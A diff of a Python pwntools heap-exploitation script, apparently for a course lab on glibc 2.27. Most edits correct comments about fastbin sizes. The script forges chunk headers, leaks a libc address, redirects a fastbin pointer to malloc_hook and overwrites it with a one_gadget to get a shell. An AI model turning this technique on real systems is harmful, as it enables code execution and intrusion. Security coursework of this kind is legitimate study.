@@ -17,15 +17,8 @@ uu64    = lambda data               :u64(data.ljust(8, '\0'))
 lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
 
 def debug(breakpoint=''):
-    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
-    gdbscript = 'directory %smalloc/\n' % glibc_dir
-    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
-    gdbscript += 'directory %sstdlib/\n' % glibc_dir
-    gdbscript += 'directory %slibio/\n' % glibc_dir
-    gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
-    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
@@ -84,13 +77,13 @@ alloc(3, 0x60)
 alloc(4, 0x10)
 
 
-## Size of chunk_0 and chunk_1 is 0x20, would be placed into tcache bin
-## fastbin(0x30) --> chunk_0 --> chunk_1
+## Size of chunk_0 and chunk_1 is 0x30, would be placed into tcache bin
+## fastbin(0x40) --> chunk_0 --> chunk_1
 free(1)
 free(0)
 
 
-## To bypass size check, we need to forge a size header for 0x30 fastbin
+## To bypass size check, we need to forge a size header for 0x40 fastbin
 ## The size of header is 0x10, thus the total size is 0x10 + 0x30 = 0x40, the last bit is freed flag
 read(1, p64(0x41) * 6)
 
@@ -116,7 +109,7 @@ read(6, "a" * 0x10 + p64(0) + p64(0x611))
 free(2)
 
 
-## Since chunk_5 is overlapped with chunk_2, we can leak out its address by chunk_5
+## Since chunk_6 is overlapped with chunk_2, we can leak out its address by chunk_6
 read(6, "a" * 0x20)
 leak_addr = u64(write(6)[0x20 : 0x26] + "\x00\x00")
 
@@ -139,20 +132,20 @@ one_gadget = libc_base + 0x4f302
 
 ## ---------------------- [Step 2] -------------------------- ##
 free(3)
-## Size of chunk_6 is 0x60, among size of fastbin
-## fast_bin(0x60) --> chunk_6
+## Size of chunk_6 is 0x70, among size of fastbin
+## fast_bin(0x70) --> chunk_6
 
 
 ## Edit fd pointer of chunk_6, let it point to malloc_hook - 0x23
 read(3, p64(malloc_hook_addr - 0x23))
 
 
-## fast_bin(0x30) --> chunk_6 --> malloc_hook - 0x23
+## fast_bin(0x70) --> chunk_6 --> malloc_hook - 0x23
 ## chunk_7 would be overlapped with chunk_6
 alloc(7, 0x60)
 
 
-## fast_bin(0x30) --> malloc_hook - 0x23
+## fast_bin(0x70) --> malloc_hook - 0x23
 ## chunk_8 would be overlapped with malloc_hook - 0x23
 alloc(8, 0x60)
 
@@ -162,9 +155,9 @@ alloc(8, 0x60)
 
 
 ## ---------------------- [Step 3] -------------------------- ##
-## Modify free_hook to be system
+## Modify malloc_hook to be one_gadget
 read(8, "a" * 0x13 + p64(one_gadget))
 
-## The below operation would be system("/bin/sh")
+## Execute one_gadget
 alloc(0, 0)
 p.interactive()
